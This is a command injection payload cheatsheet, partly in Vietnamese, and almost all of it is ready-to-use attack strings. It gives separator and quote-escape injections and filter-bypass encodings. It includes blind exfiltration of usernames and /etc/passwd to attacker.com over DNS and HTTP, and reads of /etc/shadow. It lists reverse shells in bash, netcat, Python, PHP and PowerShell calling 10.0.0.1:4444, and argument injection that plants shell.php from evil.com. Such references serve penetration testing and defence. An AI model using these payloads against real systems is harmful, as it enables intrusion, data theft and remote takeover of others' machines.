# Command Injection Payloads Cheatsheet

Quick reference payload collection cho Command Injection, organized by use case.

---

## Detection Payloads

### Basic Separators

```bash
# Cross-platform
| whoami
|| whoami
& whoami
&& whoami

# Linux only
; whoami
`whoami`
$(whoami)
%0a whoami
```

### Quoted Context Escape

```bash
# Single quote context
'; whoami #
'| whoami #
'|| whoami #

# Double quote context
"; whoami #
"| whoami #
"|| whoami #
"$(whoami)"
```

### Time-based (Blind)

```bash
# Linux
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
; ping -c 10 127.0.0.1

# Windows
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
& timeout 5
```

### OOB Detection

```bash
# DNS
; nslookup attacker.com
; nslookup $(whoami).attacker.com

# HTTP
; curl http://attacker.com/
; wget http://attacker.com/
```

---

## Command Chaining

### Sequential Execution

```bash
# Linux
cmd1; cmd2; cmd3
cmd1 && cmd2
cmd1 || cmd2
cmd1 & cmd2 & cmd3

# Windows CMD
cmd1 & cmd2 & cmd3
cmd1 && cmd2
cmd1 || cmd2
```

### Pipe Chaining

```bash
cat /etc/passwd | grep root
ls -la | head -5
```

### Command Substitution

```bash
echo `whoami`
echo $(whoami)
ping $(hostname)
```

---

## Filter Bypass Payloads

### Space Bypass

```bash
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat%09/etc/passwd
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

### Quote Insertion

```bash
w'h'o'am'i
w"h"o"am"i
wh''oami
wh""oami
who$@ami
who$()ami
```

### Backslash Insertion

```bash
w\ho\am\i
c\at /e\tc/pa\sswd
/\b\i\n/////s\h
```

### URL Encoding

```bash
; → %3b
| → %7c
& → %26
space → %20
%0a → newline
```

### Hex Encoding (Linux)

```bash
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
# = cat /etc/passwd

abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
```

### Base64 Encoding

```bash
# whoami = d2hvYW1p
bash<<<$(base64 -d<<<d2hvYW1p)
echo d2hvYW1p | base64 -d | bash
```

### Environment Variables

```bash
# Linux: / from PATH
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Windows: \ from HOMEPATH
%HOMEPATH:~0,1%
```

### Case Variation (Windows)

```cmd
WhOaMi
WHOAMI
wHoAmI
```

### Wildcards

```bash
# Linux
/???/??t /???/p??s??
# = /bin/cat /etc/passwd

# PowerShell
C:\*\*2\n??e*d.*?
```

### Brace Expansion

```bash
{cat,/etc/passwd}
{ls,-la,/home}
{,ifconfig}
```

---

## Blind Injection Payloads

### Time Delays

```bash
# Linux
; sleep 5
| sleep 5
&& sleep 5
|| sleep 5
$(sleep 5)

# Windows
& ping -n 5 127.0.0.1
& timeout 5
& powershell Start-Sleep 5
```

### Output Redirection

```bash
; whoami > /var/www/html/out.txt
; cat /etc/passwd > /tmp/data.txt
; id >> /var/www/html/log.txt
```

### DNS Exfil

```bash
; nslookup $(whoami).attacker.com
; host $(hostname).attacker.com
; for i in $(ls /); do host "$i.attacker.com"; done
```

### HTTP Exfil

```bash
; curl http://attacker.com/?d=$(whoami)
; wget http://attacker.com/?d=$(id)
; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/
```

### Time-based Data Extract

```bash
; if [ $(whoami|cut -c 1) == w ]; then sleep 3; fi
; if [ $(whoami|cut -c 2) == w ]; then sleep 3; fi
```

---

## Reconnaissance Payloads

### Linux

```bash
; id
; whoami
; uname -a
; cat /etc/passwd
; cat /etc/shadow
; ifconfig
; netstat -an
; ps aux
; env
; ls -la /
; find / -perm -4000 2>/dev/null
```

### Windows

```cmd
& whoami
& whoami /priv
& systeminfo
& ipconfig /all
& netstat -an
& tasklist
& net user
& net localgroup administrators
& type C:\Windows\win.ini
& dir C:\
```

---

## Reverse Shell Payloads

### Bash

```bash
; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Netcat

```bash
; nc -e /bin/bash 10.0.0.1 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### Python

```bash
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
; php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell

```powershell
& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
```

---

## Polyglot Payloads

Payloads work trong multiple contexts:

### Example 1

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

Works in:
- Unquoted context
- Single quote context
- Double quote context

### Example 2

```bash
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/
```

---

## Argument Injection Payloads

Khi chỉ control được arguments:

### curl

```bash
-o /var/www/html/shell.php http://evil.com/shell.php
-K http://evil.com/curl.conf
```

### wget

```bash
-O /var/www/html/shell.php http://evil.com/shell.php
```

### ssh

```bash
-o ProxyCommand="touch /tmp/pwned" user@host
```

### tar

```bash
--checkpoint=1 --checkpoint-action=exec=id
```

---

## Quick Reference Table

| Scenario | Linux Payload | Windows Payload |
|----------|---------------|-----------------|
| Basic test | `; id` | `& whoami` |
| Time delay | `; sleep 5` | `& ping -n 5 127.0.0.1` |
| File read | `; cat /etc/passwd` | `& type C:\Windows\win.ini` |
| Directory list | `; ls -la` | `& dir` |
| DNS exfil | `; nslookup $(id).x.com` | `& nslookup %USERNAME%.x.com` |
| HTTP exfil | `; curl http://x/?$(id)` | `& curl http://x/?%USERNAME%` |
| Reverse shell | `; bash -i >& ...` | `& powershell ...` |

---

## Separator Quick Reference

| Separator | Linux | Windows CMD | PowerShell |
|-----------|-------|-------------|------------|
| `;` | ✓ | ✗ | ✓ |
| `\|` | ✓ | ✓ | ✓ |
| `\|\|` | ✓ | ✓ | ✓ |
| `&&` | ✓ | ✓ | ✓ |
| `&` | ✓ | ✓ | ✓ |
| `` ` `` | ✓ | ✗ | ✓ |
| `$()` | ✓ | ✗ | ✓ |
| `%0a` | ✓ | ✓ | ✓ |
